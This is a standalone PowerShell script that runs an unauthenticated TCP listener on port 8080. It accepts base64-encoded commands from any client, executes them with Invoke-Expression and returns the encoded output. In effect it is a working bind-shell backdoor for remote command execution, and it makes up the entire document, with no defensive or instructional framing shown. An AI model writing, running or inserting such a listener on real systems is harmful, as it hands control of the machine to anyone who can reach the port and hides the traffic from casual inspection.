

function PSHandler($port)
{
    $socket = New-Object System.Net.IPEndPoint([IPAddress]::Any,$port)

    $handler = New-Object System.Net.Sockets.TCPListener $socket 

    $handler.Start()

    Write-Host "Listening on: $port"

    while($true)
    {
        $client = $handler.AcceptTCPClient()

        if($client)
        {
            $remoteAddress = $client.Client.RemoteEndPoint.Address
            $remotePort    = $client.Client.RemoteEndPoint.Port 

            Write-Host "Connection: $remoteAddress | $remotePort"

            $stream = $client.GetStream()

            $bytes = New-Object System.Byte[] 1024

            $encodingScheme = New-Object System.Text.ASCIIEncoding

            while(($var = $stream.Read($bytes,0,$bytes.Length)) -ne 0)
            {
                $cmd    = $encodingScheme.GetString($bytes,0,$var)
                $cmd    = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cmd))

                if($cmd)
                {
                    try
                    {
                        if($cmd | Select-String 'exit')
                        {
                            $client.Close()
                        }
                        else 
                        {
                            $result      = Invoke-Expression $cmd | Out-String 
                            $result      = [System.Text.Encoding]::Unicode.GetBytes($result)
                            $result      = [Convert]::ToBase64String($result)
                            $transmitter = New-Object System.IO.StreamWriter($stream)
                            $transmitter.WriteLine($result)
                            $transmitter.Flush() 
                        }
                    }
                    catch
                    {
                        continue
                    }
                }

            }
            $stream.Close()
            $client.Close()
        }
    }
}

PSHandler 8080